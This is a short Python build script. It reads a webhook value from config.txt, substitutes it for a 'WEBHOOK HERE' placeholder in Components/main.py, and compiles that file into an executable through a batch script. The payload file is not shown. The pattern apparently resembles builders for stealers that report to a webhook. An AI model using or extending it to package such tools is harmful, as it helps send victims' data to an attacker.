import subprocess


def Build():
    print("Building")
    search_text = "WEBHOOK HERE"

    def getConfig():
        with open("config.txt", "r") as f:
            webhook = f.read()
        f.close()
        return webhook

    replace_text = getConfig()

    with open(r'Components/main.py', 'r') as file:
        data = file.read()

        data = data.replace(search_text, replace_text)

    with open(r'Components/main.py', 'w') as file:
        file.write(data)

    subprocess.run([r"Components\compileToExe.bat"])
